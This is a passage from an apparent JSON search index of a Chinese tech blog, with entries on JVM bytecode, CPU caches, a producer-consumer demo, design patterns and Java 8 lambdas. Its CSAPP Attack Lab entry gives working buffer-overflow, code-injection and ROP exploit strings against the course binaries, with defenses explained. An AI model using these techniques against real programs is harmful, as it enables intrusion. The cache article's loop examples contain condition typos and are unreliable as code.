0: aload_0 1: getfield #3 // Field lock:Ljava/lang/String; 4: dup 5: astore_1 6: monitorenter 7: aload_0 8: getfield #4 // Field x:I 11: aload_1 12: monitorexit 13: ireturn 14: astore_2 15: aload_1 16: monitorexit 17: aload_2 18: athrow Exception table: from to target type 7 13 14 any 14 17 14 any LineNumberTable: line 17: 0 line 18: 7 line 19: 14 LocalVariableTable: Start Length Slot Name Signature 0 19 0 this Lcom/cuzz/jvm/bytecode/MyTest02; StackMapTable: number_of_entries = 1 frame_type = 255 /* full_frame */ offset_delta = 14 locals = [ class com/cuzz/jvm/bytecode/MyTest02, class java/lang/Object ] stack = [ class java/lang/Throwable ] 在 6 中出现 monitorenter，在 16 中出现 moniterexit","link":"/2019/03/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88%E5%9B%9B%EF%BC%89/"},{"title":"深入理解高速缓存工作原理","text":"为什么需要高速缓存早期 CPU 相比现在的 CPU 比较简单，没有 Cache 的计算机系统的简化模型，CPU在执行时需要的指令和数据通过内存总线和系统总线由内存传送到寄存器，再由寄存器送入ALU）。 那时候，CPU 内核的频率与内存总线的频率相当。内存访问只比寄存器访问慢一点。随着 CPU 内核频率不断增加，内存总线的频率和 RAM 芯片的性能并没有成比例增加。 下图展示了CPU和主存（DRAM）、磁盘速度上的差距。可以看到，CPU的速度大概是主存的几十倍，如果没有Cache（SRAM），这就出现了 CPU 等待 I/O 访存的现象，致使CPU空等一段时间，甚至可能等待几个主存周期，从而降低了CPU 的工作效率。 在 CUP 和 DRAM 之间引入高速 SRAM，来弥补这种差距，当 CPU 需要数据时，先查 SRAM（Cache）中，如果在 Cache 中可以查询到，叫作缓存命中，则就不需要访问 DRAM 了，节约时间。 程序局部性原理为了充分发挥 Cache 的能力，使得机器的速度能够切实的得到提高，必须要保障 CPU 访问的指令或数据大多情况下都能够在 Cache 中找到，这样依靠程序访问的局部性原理。 时间局部性：最近访问的数据可能在不久的将来会再次访问 空间局部性：位置相近的数据常常在相近的时间内被访问 存储山由于不同的存储技术在存储速度和造价上相差巨大，为了高效的访问数据，现代计算机的存储系统会把最常用的数据放在读存速度快的存储设备上，而把不常用的数据放在读存速度慢的存储设备上。 存储器系统是一个具有不同容量、成本和访问时间的存储设备的层级结构。从上往下容量越来越大，但访问速度越来越慢。上一层做为下一层的缓存来存储访问频率更高的数据， 比如，CPU 寄存器保存着最常用的数据。靠近 CPU 的小的、快速的高速缓存存储器是内存上一部分数据和指令的缓冲区域。主存缓存磁盘上的数据，而这些磁盘又常常作为存储在通过网络连接的其他机器的磁盘或磁带上的数据的缓冲区域。存储层次如下： 高速缓存原理假设计算机储存地址为 m 位，形成 M = 2^m 个不同的地址，就会形成 S = 2^s 个缓存组（cache set），每组包含 E 个高速缓存行（cache line），每行包含一个有效位（valid bit）指明这个行是否有效，t 个标记位（tag bit）和 B = 2^b 个缓存数据块。 Cache由硬件管理，硬件在得到内存地址后会将地址划分为三个部分 首先根据组下标选择一个组，然后将地址中的标签与被选中组的每个行中的标签进行比较，如果标签相等，且有效位为1，则 Cache 命中，再根据块偏移从行中选出相应的数据。 假设计算机储存地址为 m 位，形成 M = 2^m 个不同的地址，就会形成 S = 2^s 个缓存组（cache set），每组包含 E 个高速缓存行（cache line），每行包含一个有效位（valid bit）指明这个行是否有效，t 个标记位（tag bit）和 B = 2^b 个缓存数据块 假设 m = 4，t = 2，s = 1，b = 1，E = 2 可知： M = 2^m = 2^4 = 16 S = 2^s = 2^1 = 2 B = 2^b = 2^1 = 2 分别读取地址为 0、1、7、8、0 这几个地址，看看缓存能命中哪些？ 具体过程如图： 高速缓存不命中替换 如果 CPU 请求的数据不在任何一行中，那么缓存不命中，如果有空行的话就把数据缓存到空行中，如果没有空行，那我们必须选择一个非空行替换。可以使用 LRU 算法来替换。 为什么使用中间位来做索引？假设我们有一个缓存组可以缓存四块，如果我们去 0000 这块数据，并且把 0001、0002 和 0003 这三块数据加入缓存中，就会发现，使用高位缓存只能缓存一块数据，而使用中间位来索引可以缓存四块数据。所以使用高位做缓存缓存的使用效率很低。 高速缓存读与写高速缓存读 首先，在高速缓存中查找所需字 w 的副本。如果命中，立即返回字 w 给CPU。如果不命中，从存储器层次结构中较低层中取出包含字 w 的块，将这个块存储到某个高速缓存行中，然后返回字 w。 高速缓存写 写命中 直写（write-through），写一个已经缓存了的字w（写命中，write hit），立即将w的高速缓存块写回到紧接着的低一层中。 写回（write-back），尽可能的推迟更新，只有当替换算法要驱逐这个更新过的块时，才把写到紧接着的低一层中。高速缓存必须为每一个高速缓存行维护一个额外的修改位（dirty bit），表明这个高速缓存块是否被修改过。 写不命中 写分配（write-allocate），加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。 非写分配（not-write-allocate），避开高速缓存，直接把这个字写到低一层中。 Cache 失效的三种原因 Cold miss：刚刚使用Cache时Cache为空，此时必然发生Cache miss。 Capacity miss：程序最经常使用的那些数据(工作集,working set)超过了Cache的大小 Conflict miss：Cache容量足够大，但是不同的数据映射到了同一组，从而造成Cache line反复被替换的现象。 高速缓存结构我们看看 Intel Core i7 处理器的高速缓存层次结构。每个 CPU 芯片有四个核。每个核有自己的 L1 i-cache（指令高速缓存）、L1 d-cache（数据高速缓存）、和 L2 统一高速缓存。以及 L3 为所有核共享高速缓存。所有的缓存都是集成在 CPU 芯片上。 下面指标高速缓存类型（Cache Type）、访问周期（Access time）、缓存大小（Cache size）、一组有多少行（Assoc）、块大小（Block size）以及组数（Set）。 编写高速缓存友好代码假设我们需要来计算一个二维数组的和，有两种方式分别是按行计算和按列计算。 假设我们高速缓存为 4 字，可以缓存 4 和 int 的值。 按行计算 int sumarrrayrows(int a[M][N]) { int i, j, sum = 0; for (i = 0; i &lt; M; i++) { for (j = 0; i &lt; N; j++) { sum += a[i][j]; } } return sum;} 当我们加载地址为1的数，会把 2、3和4地址的数据加载到高速缓存中，如果是按行，后面这几个就会缓存命中。 具体缓存命中情况如图： 按列计算 int sumarrraycols(int a[M][N]) { int i, j, sum = 0; for (j = 0; i &lt; N; j++) { for (i = 0; i &lt; M; i++) { sum += a[i][j]; } } return sum;} 当我们加载地址为1的数，会把 2、3和4地址的数据加载到高速缓存中，然而我们下个取得是 5 所以缓存不命中，同时会把 6、7和8地址加到缓存中。接着下个取地址为9的值，缓存又不命中。 具体缓存情况如图： 我们看上去只是调换了一下顺序，缓存命中相差很大，所以编写高速缓存友好代码。 总结学习到了高速缓存原理，以及编写高速缓存友好代码。 参考 深入理解计算机系统 深入理解处理器高速缓存的工作机制 Linux内存系列2 - CPU Cache 计算机组成原理（2）-cache高速缓存存储器","link":"/2020/11/28/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"},{"title":"生产者消费者","text":"维基百科解释： In computing, the producer–consumer problem[1][2] (also known as the bounded-buffer problem) is a classic example of a multi-process synchronization problem. The problem describes two processes, the producer and the consumer, who share a common, fixed-size buffer used as a queue. The producer’s job is to generate data, put it into the buffer, and start again. At the same time, the consumer is consuming the data (i.e., removing it from the buffer), one piece at a time. The problem is to make sure that the producer won’t try to add data into the buffer if it’s full and that the consumer won’t try to remove data from an empty buffer. import java.util.LinkedList;import java.util.List;import java.util.Random;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;/** * @Author: cuzz * @Date: 2019/4/6 13:03 * @Description: 生产者消费者 */public class ProducerConsumerDemo { public static void main(String[] args) { Container container = new Container(); ExecutorService executor = Executors.newFixedThreadPool(2); executor.execute(() -&gt; container.produce()); executor.execute(() -&gt; container.consume()); executor.shutdown(); }}class Container { private List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); private final int MAX_SIZE = 5; private Random random = new Random(); public void produce() { while (true) { synchronized (this) { try { while (list.size() &gt;= MAX_SIZE) { wait(); } int i = random.nextInt(); System.out.println(&quot;produce...&quot; + i); list.add(i); notify(); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } } } } public void consume() { while (true) { try { synchronized (this) { while (list.isEmpty()) { wait(); } int i = list.remove(0); System.out.println(&quot;consume...&quot; + i); notify(); Thread.sleep(1000); } } catch (InterruptedException e) { e.printStackTrace(); } } }}","link":"/2019/04/06/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85/"},{"title":"设计模式","text":"前言在公司上班一段时间了，大大小小的项目也写了不少，有时候想抽象和优化一些代码结构没什么思路。现在系统学习一遍设计模式，吸取前人的智慧，开拓自己的视野，让代码更优雅和灵活。 设计模式的七大原则编写软件过程中，程序员面临着来自耦合性，内聚性以及可维护性，可扩展性，重用性，灵活性等多方面的挑战，设计模式是为了让程序(软件)，具有更好代码重用性、可读性、可扩展性、可靠性，使程序呈现高内聚，低耦合的特性。 设计模式常用的七大原则有： 单一职责原则 接口隔离原则 依赖倒置原则 里氏替换原则 开闭原则 迪米特法则 合成复用原则 单一职责原则","link":"/2000/04/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"title":"Attack Lab","text":"介绍主要分为两种不同类型的攻击： Buffer overflow attacks ROP attacks 大概介绍下每个文件的作用： ctarget: 用来做代码注入攻击的程序 rtarget: 用来做 ROP 攻击的程序 cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符 farm.c: 用来找寻 gadget 的源文件 hex2raw: 用来生成攻击字符串的程序 有几点需要注意： 输入的字符串中不能有 0x0a，因为这是 \\n 的意思，遇到这个的话会提前结束输入 hex2raw 每次需要输入一个 2 位的 16 进制编码，如果想要输出 0，那么需要写 00。想要转换 0xdeadbeef，需要传入 ef be ad de，因为是 little-endian 规则 通过完成本实验达到： 深入理解当程序没有对缓冲区溢出做足够防范时，攻击者可能会如何利用这些安全漏洞。 深入理解x86-64机器代码的栈和参数传递机制。 深入理解x86-64指令的编码方式。 熟练使用 gdb 和 objdump 等调试工具。 更好地理解写出安全的程序的重要性，了解到一些编译器和操作系统提供的帮助改善程序安全性的特性。 背景知识缓冲区溢出我们通过一个一个例子来观察： #include&lt;stdio.h&gt;typedef struct { int a[2]; double d;} struct_t;double fun(int i) { volatile struct_t s; s.d = 3.14; s.a[i] = 1073741824; /* Possibly out of bounds */ return s.d;}int main() { int i = 0; double d = 0.0; while(1) { scanf(&quot;%d&quot;, &amp;i); d = fun(i); printf(&quot;fun(%d) -&gt; %.10f \\n&quot;,i, d); }} 输出结果： fun(0) -&gt; 3.1400000000fun(1) -&gt; 3.1400000000fun(2) -&gt; 3.1399998665fun(3) -&gt; 2.0000006104fun(4) -&gt; 3.1400000000fun(5) -&gt; 3.1400000000fun(6) -&gt; segmentation fault 具体内存中 6 其他特殊字节 f(6)改变了栈中的关键信息，报错5 其他特殊字节 f(5)改变了栈中的非关键信息，不影响4 其他特殊字节 f(4)改变了栈中的非关键信息，不影响3 d中高4字节 f(3)改变了d中的高4字节2 d中低4字节 f(2)改变了d中的低4字节1 a[1] f(1)改变不影响0 a[0] f(0)改变不影响 在 Unix 标准库中的 gets 函数也会出现缓存溢出，随着用户不断输入，缓存区可以不够。 char *gets(char *dest) { int c = getchar(); char *p = dest; while (c != EOF &amp;&amp; c != '\\n') { *p++ = c; c = getchar(); } *p = '\\0'; return dest; } 由于C语言中对数组引用不做任何边界检查，而且局部变量和状态信息（例如保存的寄存器值和返回地址）都存放在栈中，所以对越界的数组元素的写操作会破坏存储在栈中的状态信息，可能会产生严重的后果。 栈溢出攻击栈溢出（stack-based buffer overflows）算是安全界常见的漏洞。一方面因为程序员的疏忽，使用了 strcpy、sprintf 等不安全的函数，增加了栈溢出漏洞的可能。另一方面，因为栈上保存了函数的返回地址等信息，因此如果攻击者能任意覆盖栈上的数据，通常情况下就意味着他能修改程序的执行流程，从而造成更大的破坏。这种攻击方法就是栈溢出攻击（stack smashing attacks） #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* target code */void smash(){ printf(&quot;I've been smashed!\\n&quot;); exit(0);}/* Implementation of library function gets() */char *gets(char *s){ int c; char *dest = s; while((c = getchar()) != '\\n' &amp;&amp; c != EOF) *dest++ = c; if(c == EOF &amp;&amp; dest == s) /* No characters read */ return NULL; *dest++ = '\\0'; /* Terminate string */ return s;}/** Read input line and write it back */void echo(){ char buf[4]; gets(buf); puts(buf);}int main(int argc, char* argv[]){ echo(); return 0;} 使用如下命令编译： gcc -fno-asynchronous-unwind-tables -fno-stack-protector -O1 echo.c -o echo -fno-asynchronous-unwind-tables :不生成CFI指令 -fno-stack-protector :阻止进行栈破坏检测，默认是允许使用栈保护者 -O1:不做任何优化处理 使用objdump反汇编得到如下结果： 000000000000073a &lt;smash&gt;: 73a: 48 83 ec 08 sub $0x8,%rsp 73e: 48 8d 3d 1f 01 00 00 lea 0x11f(%rip),%rdi # 864 &lt;_IO_stdin_used+0x4&gt; 745: e8 a6 fe ff ff callq 5f0 &lt;puts@plt&gt; 74a: bf 00 00 00 00 mov $0x0,%edi 74f: e8 bc fe ff ff callq 610 &lt;exit@plt&gt;000000000000079d &lt;echo&gt;: 79d: 53 push %rbx 79e: 48 83 ec 10 sub $0x10,%rsp 7a2: 48 8d 5c 24 0c lea 0xc(%rsp),%rbx 7a7: 48 89 df mov %rbx,%rdi 7aa: e8 a5 ff ff ff callq 754 &lt;gets&gt; 7af: 48 89 df mov %rbx,%rdi 7b2: e8 39 fe ff ff callq 5f0 &lt;puts@plt&gt; 7b7: 48 83 c4 10 add $0x10,%rsp 7bb: 5b pop %rbx 7bc: c3 retq 00000000000007bd &lt;main&gt;: 7bd: 48 83 ec 08 sub $0x8,%rsp 7c1: b8 00 00 00 00 mov $0x0,%eax 7c6: e8 d2 ff ff ff callq 79d &lt;echo&gt; 7cb: b8 00 00 00 00 mov $0x0,%eax # 调用echo之后返回这里 7d0: 48 83 c4 08 add $0x8,%rsp 7d4: c3 retq 7d5: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 7dc: 00 00 00 7df: 90 nop 具体的执行到 echo 函数的栈帧，当我们输入超过 23 个字符（加上\\0 一共24个），就会影响到返回地址。如果最后地址为00000000 0000073a 就能转到 smash 方法。 代码注入攻击Code Injection Attacks（代码注入攻击）是指输入的字符串中包含exploit code的字节表示，将返回地址改成exploit code的首地址，这样在ret时将会跳转到exploit code处执行。 ROP 攻击缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。 （1）栈随机化 栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。 （2）栈破坏检测 最近的GCC版本在产生的代码加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。 （3）限制可执行代码区域 最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。 ROP全称为Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。 在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以ret结尾，这一段指令序列，我们称之为gadget。 每一段gadget包含一系列指令字节，而且以ret结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码，对程序造成攻击。 示例 void setval_210(unsigned *p){ *p = 3347663060U;} 对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列: 0000000000400f15 &lt;setval_210&gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 其中，字节序列48 89 c7是对指令movq %rax, %rdi的编码，这就是一个 gadget，就这样我们可以利用已经存在的程序，从中提取出特定的指令，执行特定的功能，地址为0x400f18，其功能是将%rax的内容移到%rdi。 下面是指令参考表： 防止栈溢出攻击方法 避免使用gets等存在安全隐患的库函数 操作系统层面：栈随机偏移。在每次程序执行之初，在栈上申请一段随机大小的空间使整个栈移动一段距离，这样可以防止黑客预测exploit code开始的地址 操作系统层面：将栈设置为不可执行(Nonexecutable)，这样执行exploit code时会报错 金丝雀(canary)机制。在buffer之外放置一个特殊的保护值(canary)，在函数执行完返回之前检查保护值是否被更改，如果被更改则检测到stack smashing。 实验部分阶段一这个需要我们在执行 test ，可以调用另外方法，进行劫持程序。在这个阶段中，我们的任务是在test函数执行完getbuf后返回到touch1函数。 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch1(){ vlevel = 1; /* Part of validation protocol */ printf(&quot;Touch1!: You called touch1()\\n&quot;); validate(1); exit(0);} 思路： 找到getbuf函数在栈上为输入字符串分配的缓冲区大小 找到touch1函数的首地址 构造 exploit code，将缓冲区填满，并在随后的8个字节(返回地址)上填写touch1函数的首地址 查看 getbuf 缓冲区大小，sub $0x28,%rsp，可以知道在栈上分配了 40 字节大小。 (gdb) disas getbufDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retqEnd of assembler dump. 找到 touch1 的首地址，为 0x004017c0 (gdb) disas touch1Dump of assembler code for function touch1: 0x00000000004017c0 &lt;+0&gt;: sub $0x8,%rsp 0x00000000004017c4 &lt;+4&gt;: movl $0x1,0x202d0e(%rip) # 0x6044dc &lt;vlevel&gt; 0x00000000004017ce &lt;+14&gt;: mov $0x4030c5,%edi 0x00000000004017d3 &lt;+19&gt;: callq 0x400cc0 &lt;puts@plt&gt; 0x00000000004017d8 &lt;+24&gt;: mov $0x1,%edi 0x00000000004017dd &lt;+29&gt;: callq 0x401c8d &lt;validate&gt; 0x00000000004017e2 &lt;+34&gt;: mov $0x0,%edi 0x00000000004017e7 &lt;+39&gt;: callq 0x400e40 &lt;exit@plt&gt;End of assembler dump. 前 40 位可以任意输入，只是为了填充缓冲区，最后 8 位是我们的构造 touch1 的地址 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00c0 17 40 0000 00 00 00 具体在栈帧中，如图 测试结果 &gt; ./hex2raw -i solution1.hex &gt; solution1.raw&gt; ./ctarget -q &lt; solution1.rawCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00ubuntu@10-13-181-207:~/cuzz/csapp 阶段二第二阶段的任务是在test函数执行完getbuf后去执行touch2，注意touch2有一个参数，我们需要在执行touch2之前把参数val设置为cookie，cookie的值在cookie.txt中。 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val); validate(2); } else { printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val); fail(2); } exit(0);} 使用代码注入攻击，输入的字符串中包含攻击指令，然后将返回地址改成攻击指令的地址。这段程序就是验证传进来的参数val是否和cookie中值相等。本文中我的cookie值为：0x59b997fa 在输入字符串中包含 exploit code 将返回地址设置为 exploit code 开始的地址 在 exploit code 中完成参数设置，将 touch2 的首地址压栈，通过 ret 指令跳到 touch2 执行 具体过程如下： 综上所述，可以得到注入的代码为，创建一个 solution2.s 汇编文件 movq $0x59b997fa, %rdi # 把cookie设置为第一个参数pushq $0x4017ec # 将touch2的首地址压栈ret # 跳转到touch2 将汇编转化为机器指令 &gt; gcc -c solution2.s&gt; objdump -d solution2.oDisassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq 得到的序列为： 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 接下来找到 getbuf 方法中的 %rsp 值，看看缓存区是从哪里开始 (gdb) run -qStarting program: /home/ubuntu/cuzz/csapp/target1/ctarget -qCookie: 0x59b997faBreakpoint 1, getbuf () at buf.c:1212 buf.c: No such file or directory.(gdb) disasDump of assembler code for function getbuf:=&gt; 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retqEnd of assembler dump.(gdb) stepi14 in buf.c(gdb) disasDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp=&gt; 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retqEnd of assembler dump.(gdb) p /x $rsp$1 = 0x5561dc78(gdb) 可以知道 %rsp 的值为 0x5561dc78，构造输入字符串 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 # exploit code00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # 填充78 dc 61 55 00 00 00 00 # 返回地址 测试结果 &gt; ./hex2raw -i solution2.hex &gt; solution2.raw&gt; ./ctarget -q &lt; solution2.rawCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 阶段三这个也是进行代码注入攻击，需要传递一个字符串到 touch3 方法中。 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch3(char *sval){ vlevel = 3; if (hexmatch(cookie, sval)){ printf(&quot;Touch3!: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); validate(3); } else { printf(&quot;Misfire: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); fail(3); } exit(0);}int hexmatch(unsigned val, char *sval){ char cbuf[110]; char *s = cbuf + random() % 100; sprintf(s, &quot;%.8x&quot;, val); return strncmp(sval, s, 9) == 0; # 检查字符串以0结尾} 这次比较字符串，我们不能把他保存在 getbuf栈帧中，因为数据可能会被 hexmatch 重写，放在 getbuf 中并不安全，我们可以放在 test 栈帧中。 具体如图 将 cookie 转为字符串表达形式，对应 ASCII 表 0x45374fee -&gt; 34 35 33 37 34 66 65 65 注入汇编代码 movq $0x5561dca8, %rdipushq $0x4018faret 转换为机器指令 &gt; gcc -c solution3.s&gt; objdump -d solution3.oDisassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq 最终得到 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 //inject code00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 // return address 35 39 62 39 39 37 66 61 00 // cookie 测试结果 &gt; ./hex2raw -i solution3.hex &gt; solution3.raw&gt; ./ctarget -q &lt; solution3.rawCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 阶段四这一阶段还是要劫持 touch2 函数，但是不能用注入攻击，因为使用了两种手段来阻止 栈随机化 将栈锁在的内存标记为不可执行 我们只能通过 ROP 方式来攻击 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val); validate(2); } else { printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val); fail(2); } exit(0);} 注意这里的内容都是 16 进制。另外两个指令是： ret: 一个字节编码 0xc3 nop: 什么都不做，只是让程序计数器加一，一个字节编码 0x90 我们需要代码序列为 popq %raxmovq %rax, %rdi popq %rax的指令字节为：58，所以我们找到了如下函数： 00000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 从中我们可以得出popq %rax指令的地址为：0x4019ab movq %rax, %rdi的指令字节为：48 89 c7，所以我们找到了如下函数： 00000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 从中我们可以得出movq %rax, %rdi指令的地址为：0x4019a2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 # gadget 1fa 97 b9 59 00 00 00 00 # cookiea2 19 40 00 00 00 00 00 # gadget 2ec 17 40 00 00 00 00 00 # touch2地址 具体如图 popq 相当于 %rsp 减 8 指向 cookie，然后（%rsp) 值赋值给 %rax ，接着 ret ，%rsp 减 8 ，指向 movq 这里，这里把 cookie 放到 %rdi 中作为第一个参数。 测试 &gt; ./hex2raw -i solution4.hex &gt; solution4.raw&gt; ./rtarget -q &lt; solution4.rawCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 总结整个 lab 做完，对栈的分配依据栈缓冲区有了更深入的理解，认识了栈溢出攻击和 ROP 攻击，知道了其中原理，以及如何避免这样的攻击，整体来说还是很有意义的 lab。 参考 The Attack Lab: Understanding Buffer Overflow Bugs CSAPP:Lab3-Attack Lab CMU 15-213 CSAPP 深入理解计算机系统","link":"/2020/11/15/CSAPP_Attack_Lab/"},{"title":"Java8的深入与实战","text":"Lambda 表达式和函数式接口 Lambda 表达式定义： Lambda: In programming languages such as Lisp, Python and Ruby lambda is an operator used to denote anonymous functions or closures, following the usage of lambda calculus. 为何需要使用 Lambda 表达式： 在 Java 中，我们无法将函数作为一个参数传递给一个方法，也无法声明一个返回一个函数的方法。 在 JavaScript 中，函数的参数是一个函数，返回值是另一个函数的情况是非常常见的，JavaScript 是一门典型的函数式语言。 我们通过一个例子来引入： /** * @Author: cuzz * @Date: 2019/8/11 14:55 * @Description: */public class Test1 { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(1, 2, 3, 4, 5, 6); for (int i = 0; i &lt; list.size(); i++) { System.out.println(list.get(i)); } System.out.println(&quot;-----------------&quot;); for (int val : list) { System.out.println(val); } System.out.println(&quot;-----------------&quot;); list.forEach(new Consumer&lt;Integer&gt;() { @Override public void accept(Integer integer) { System.out.println(integer); } }); }} 这是 3 种遍历集合的方式，第一就是简单的遍历，第二种是我们是常说的增强 for 循环遍历。第三种就是 Java 8 新增的方法，先看看 Consumer 这个接口。 package java.util.function;import java.util.Objects;@FunctionalInterfacepublic interface Consumer&lt;T&gt; { void accept(T t); default Consumer&lt;T&gt; andThen(Consumer&lt;? super T&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; { accept(t); after.accept(t); }; }} 注解上是一个函数式接口，我们看看这个接口的作用。 package java.lang;import java.lang.annotation.*;/** * An informative annotation type used to indicate that an interface * type declaration is intended to be a &lt;i&gt;functional interface&lt;/i&gt; as * defined by the Java Language Specification. * * Conceptually, a functional interface has exactly one abstract * method. Since {@linkplain java.lang.reflect.Method#isDefault() * default methods} have an implementation, they are not abstract. If * an interface declares an abstract method overriding one of the * public methods of {@code java.lang.Object}, that also does * &lt;em&gt;not&lt;/em&gt; count toward the interface's abstract method count * since any implementation of the interface will have an * implementation from {@code java.lang.Object} or elsewhere. * * 